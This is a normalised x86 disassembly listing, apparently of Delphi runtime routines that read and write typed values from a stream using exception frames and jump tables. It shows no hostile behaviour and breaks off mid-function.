mov eax [ ebp - 0x4 ]
call sub_41d6f0
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c6c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d7ac
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414d80
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d5d4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414998
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41be30
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41be30
cmp al 0xd
jne r-xdata
push ebp
call sub_41ce24
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca0c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415298
jmp r-xdata
push ebp
call sub_41ce80
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414924
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9a0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414998
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c8a0
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41cd9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d890
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414998
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41c8a0
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d890
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415238
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d890
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414924
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41bf48
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415238
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c8a0
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41cde4
pop ecx
jmp r-xdata
sub_41d248
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_40405c
jmp r-xdata
mov eax [ ebx ]
call sub_417d10
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d2a8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d5c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d690
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41d5a1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d562
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
mov eax [ ebp - 0x1c ]
call sub_417868
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d248
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031d8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4175b8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d507
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405fa4
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4181b4
xor eax eax
push ebp
push sub_41d4e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41836c
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4ee
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403290
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_418310
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d538
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403ac0
jmp r-xdata
call sub_403a6c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41b63c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d567
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41b7e4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a6c
call sub_403ac0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403290
sub_41d5d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d67e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d651
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d890
cmp al 0xb
je r-xdata
mov eax ebx
call sub_41469c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41b92c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41b964
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d685
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41d6b4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41be54
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040f8
mov eax esi
call j_sub_4044d4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41be54
pop edx
pop esi
pop ebx
retn
sub_41d6f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d79d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41be30
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41d7ac
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404290
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7a4
lea eax [ ebp - 0x8 ]
call sub_4046e8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d890
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41be54
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404654
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41be54
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41be54
jmp r-xdata
jmp r-xdata
call sub_41b92c
sub_41d7ac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d883
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41be30
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d6f0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404834
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d88a
lea eax [ ebp - 0xc ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d890
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41be54
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404930
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41be54
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41be54
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404654
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41be54
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405c44
jmp r-xdata
jmp r-xdata
call sub_41b92c
sub_41d8a4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41d8e0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d6b4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d8e7
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41d8ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41baec
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d9a0
mov eax [ ebx ]
call sub_41ca58
pop ebx
pop ebp
retn
sub_41d914
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41be54
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dd98
pop ebx
pop ecx
pop ebp
retn
sub_41d944
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41baec
test al al
je r-xdata
mov eax [ ebx ]
call sub_41be30
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41ca58
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41dd98
jmp r-xdata
mov eax [ ebx ]
call sub_41d9a0
mov eax [ ebx ]
call sub_41baec
test al al
je r-xdata
mov eax [ ebx ]
call sub_41db3c
mov eax [ ebx ]
call sub_41ca58
sub_41d9a0
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41db2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d890
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db36
lea eax [ ebp - 0x8 ]
call sub_404008
retn
jmp [ eax * 4 + jump_table_41d9d7 ]
push ebp
call sub_41d8ec
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d6b4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d914
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d8a4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d914
pop ecx
jmp r-xdata
push ebp
call sub_41d944
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
push ebp
mov eax 0x2
call sub_41d914
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41dd98
jmp r-xdata
push ebp
mov eax 0x1
call sub_41d914
pop ecx
sub_41db3c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41db79
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d6b4
mov eax ebx
call sub_41d9a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db80
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41db84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41dc1c
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41baec
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d6b4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41d6b4
jmp r-xdata
mov eax ebx
call sub_41db3c
mov eax ebx
call sub_41ca58
jmp r-xdata
mov eax ebx
call sub_41baec
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41db84
mov eax ebx
call sub_41ca58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc23
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_41dc2c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41dcd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040a0
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_420c1c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcd8
lea eax [ ebp - 0x8 ]
call sub_404008
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
sub_41dcfc
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41dd24
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41bd84
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4177a8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4034a4
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41bd84
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41dd98
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41be54
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41be54
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41dde0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41df89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41b9b8
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41df64
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41be54
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41a8e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41be54
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b274
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41df3f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d6f0
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41be54
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41a8e4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41be54
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414324
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
lea eax [ ebp - 0x1c ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d0a4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df46
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_41dfa8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e1a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ed58
mov eax [ ebp - 0x4 ]
call sub_41be30
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp [ eax * 4 + jump_table_41dfea ]
mov eax [ ebp - 0x4 ]
call sub_41d890
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9a0
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_412ee8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9a0
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_412ee8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9a0
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412ee8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c784
mov eax ebx
call sub_4130e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c7c8
mov eax ebx
call sub_4130e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c80c
mov eax ebx
call sub_413108
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c85c
mov eax ebx
call sub_4130f4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d6f0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41311c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d7ac
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413148
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d890
cmp al 0x9
sete dl
mov eax ebx
call sub_4130b8
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41dde0
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f080
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca0c
push edx
push eax
mov eax ebx
call sub_412fe4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e1a9
lea eax [ ebp - 0x1c ]
call sub_40ed6c
lea eax [ ebp - 0xc ]
call sub_4046e8
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax ebx
call sub_41440c
jmp r-xdata
sub_41e1b0
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_41e37c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b2bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_41e1e8
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_42028c
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e210
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_42028c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e2f4
sub_41e254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a860
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e37c
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a880
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e2a8
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e37c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e2f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e36b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_4204c8
mov eax [ ebp - 0x4 ]
